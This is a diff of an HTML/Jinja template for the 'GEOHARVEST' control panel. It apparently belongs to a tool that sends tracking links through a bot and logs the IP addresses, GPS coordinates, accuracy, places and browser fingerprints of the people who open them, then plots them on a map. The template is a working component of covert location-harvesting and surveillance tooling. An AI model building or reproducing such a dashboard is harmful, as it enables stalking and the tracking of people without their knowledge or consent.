@@ -1,37 +1,141 @@
 <!doctype html>
-<html><head><meta charset="utf-8"><title>GEOHARVEST</title>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GEOHARVEST · control</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📡</text></svg>">
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
 <style>
- body{margin:0;font:14px/1.5 ui-monospace,Menlo,monospace;background:#0b0f14;color:#dde}
- h2{padding:14px 18px;margin:0;border-bottom:1px solid #1f2b39;font-size:14px}
- table{width:100%;border-collapse:collapse}
- td,th{padding:6px 10px;border-bottom:1px solid #16202b;text-align:left;font-size:12px;vertical-align:top}
- th{color:#7f8fa4;font-weight:500}
- a{color:#58a6ff;text-decoration:none}
- #map{height:340px;margin:14px 18px;border-radius:10px}
- .g{color:#3fb950}.r{color:#f85149}
-</style></head><body>
-<h2>GEOHARVEST · {{ targets|length }} targets · {{ hits|length }} hits</h2>
+  :root{--bg:#0b0f14;--panel:#111823;--line:#1f2b39;--txt:#dde6f0;--dim:#7f8fa4;
+        --ok:#3fb950;--bad:#f85149;--acc:#58a6ff;--warn:#d29922}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--txt);
+       font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
+  header{display:flex;flex-wrap:wrap;gap:14px;align-items:center;justify-content:space-between;
+         padding:14px 18px;border-bottom:1px solid var(--line);background:var(--panel)}
+  h1{font-size:13px;margin:0;font-weight:600;letter-spacing:.4px}
+  h1 b{color:var(--ok)}
+  .stat{display:flex;gap:16px;font-size:12px;color:var(--dim)}
+  .stat b{color:var(--txt);font-weight:600}
+  h2{font-size:11.5px;margin:0;padding:11px 18px;color:var(--dim);
+     border-bottom:1px solid var(--line);letter-spacing:1.1px;text-transform:uppercase;
+     background:var(--panel)}
+  #map{height:330px;margin:14px 18px;border-radius:10px;border:1px solid var(--line)}
+  .leaflet-container{background:#0d1319}
+  table{width:100%;border-collapse:collapse}
+  th,td{padding:7px 10px;border-bottom:1px solid #16202b;text-align:left;
+        font-size:11.5px;vertical-align:top;word-break:break-word}
+  th{color:var(--dim);font-weight:500;background:#0e1520;position:sticky;top:0}
+  tr:hover td{background:#0e1520}
+  a{color:var(--acc);text-decoration:none}
+  a:hover{text-decoration:underline}
+  .g{color:var(--ok)}.r{color:var(--bad)}.w{color:var(--warn)}
+  .pill{display:inline-block;padding:1px 6px;border-radius:99px;font-size:10.5px;
+        border:1px solid var(--line)}
+  .pill.gps,.pill.refine{color:var(--ok);border-color:rgba(63,185,80,.4)}
+  .pill.denied,.pill.timeout{color:var(--bad);border-color:rgba(248,81,73,.4)}
+  .pill.fingerprint{color:var(--acc);border-color:rgba(88,166,255,.4)}
+  .empty{padding:22px 18px;color:var(--dim);font-size:12px}
+  .wrap{overflow-x:auto}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>GEOHARVEST · <b>CONTROL</b></h1>
+  <div class="stat">
+    <span>targets <b>{{ targets|length }}</b></span>
+    <span>hits <b>{{ hits|length }}</b></span>
+    <span>located <b class="g">{{ hits|selectattr('lat')|list|length }}</b></span>
+  </div>
+</header>
+
 <div id="map"></div>
+
 <h2>Targets</h2>
-<table><tr><th>token</th><th>label</th><th>created</th><th>hits</th><th>link</th></tr>
-{% for t in targets %}<tr>
-<td>{{ t.token }}</td><td>{{ t.label }}</td><td>{{ t.created_at }}</td>
-<td class="{{ 'g' if t.n else 'r' }}">{{ t.n }}</td>
-<td><a href="/t/{{ t.token }}" target="_blank">open</a></td></tr>{% endfor %}</table>
+{% if targets %}
+<div class="wrap">
+<table>
+  <thead><tr><th>token</th><th>label</th><th>created</th><th>hits</th><th>link</th></tr></thead>
+  <tbody>
+  {% for t in targets %}
+    <tr>
+      <td><code>{{ t.token }}</code></td>
+      <td>{{ t.label or '—' }}</td>
+      <td>{{ t.created_at }}</td>
+      <td class="{{ 'g' if t.n else 'r' }}">{{ t.n }}</td>
+      <td><a href="{{ base }}/t/{{ t.token }}" target="_blank" rel="noopener">open ↗</a></td>
+    </tr>
+  {% endfor %}
+  </tbody>
+</table>
+</div>
+{% else %}
+  <p class="empty">No targets yet. Send <code>/new label</code> to the bot.</p>
+{% endif %}
+
 <h2>Hit log</h2>
-<table><tr><th>ts</th><th>token</th><th>stage</th><th>ip</th><th>coords</th><th>place</th></tr>
-{% for h in hits %}<tr>
-<td>{{ h.ts }}</td><td>{{ h.token }}</td><td>{{ h.stage }}</td><td>{{ h.ip }}</td>
-<td>{% if h.lat %}<a href="https://maps.google.com/?q={{ h.lat }},{{ h.lon }}" target="_blank">{{ '%.5f'|format(h.lat) }}, {{ '%.5f'|format(h.lon) }}</a> ±{{ h.acc|int }}{% endif %}</td>
-<td>{{ h.place or '' }}</td></tr>{% endfor %}</table>
+{% if hits %}
+<div class="wrap">
+<table>
+  <thead><tr><th>ts</th><th>token</th><th>stage</th><th>ip</th><th>coords</th><th>±m</th><th>place</th></tr></thead>
+  <tbody>
+  {% for h in hits %}
+    <tr>
+      <td>{{ h.ts }}</td>
+      <td><code>{{ h.token }}</code></td>
+      <td><span class="pill {{ h.stage }}">{{ h.stage }}</span></td>
+      <td>{{ h.ip }}</td>
+      <td>
+        {% if h.lat %}
+          <a href="https://maps.google.com/?q={{ h.lat }},{{ h.lon }}" target="_blank" rel="noopener">
+            {{ '%.5f'|format(h.lat) }}, {{ '%.5f'|format(h.lon) }}</a>
+        {% else %}—{% endif %}
+      </td>
+      <td>{{ h.acc|int if h.acc else '—' }}</td>
+      <td>{{ h.place or '—' }}</td>
+    </tr>
+  {% endfor %}
+  </tbody>
+</table>
+</div>
+{% else %}
+  <p class="empty">No hits recorded.</p>
+{% endif %}
+
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
- const m = L.map('map').setView([20,0],2);
- L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(m);
- const pts = {{ hits|selectattr('lat')|map(attribute='lat')|list|tojson }};
- const lns = {{ hits|selectattr('lat')|map(attribute='lon')|list|tojson }};
- const tks = {{ hits|selectattr('lat')|map(attribute='token')|list|tojson }};
- pts.forEach((la,i)=>L.marker([la,lns[i]]).addTo(m).bindPopup(tks[i]));
- if(pts.length) m.fitBounds(pts.map((la,i)=>[la,lns[i]]),{padding:[40,40]});
-</script></body></html>
+(function () {
+  var pts = {{ hits|selectattr('lat')|map(attribute='lat')|list|tojson }};
+  var lns = {{ hits|selectattr('lat')|map(attribute='lon')|list|tojson }};
+  var tks = {{ hits|selectattr('lat')|map(attribute='token')|list|tojson }};
+  var stg = {{ hits|selectattr('lat')|map(attribute='stage')|list|tojson }};
+  var tms = {{ hits|selectattr('lat')|map(attribute='ts')|list|tojson }};
+
+  var map = L.map("map", { worldCopyJump: true }).setView([20, 0], 2);
+  L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+    maxZoom: 19,
+    attribution: "© OpenStreetMap"
+  }).addTo(map);
+
+  var bounds = [];
+  pts.forEach(function (lat, i) {
+    var col = stg[i] === "gps" ? "#3fb950" : "#58a6ff";
+    var m = L.circleMarker([lat, lns[i]], {
+      radius: 7, color: col, weight: 2, fillColor: col, fillOpacity: .35
+    }).addTo(map);
+    m.bindPopup(
+      "<b>" + tks[i] + "</b><br>" + stg[i] + "<br>" + tms[i]
+    );
+    bounds.push([lat, lns[i]]);
+  });
+
+  if (bounds.length === 1) map.setView(bounds[0], 15);
+  else if (bounds.length > 1) map.fitBounds(bounds, { padding: [40, 40] });
+
+  setTimeout(function () { map.invalidateSize(); }, 250);
+})();
+</script>
+</body>
+</html>
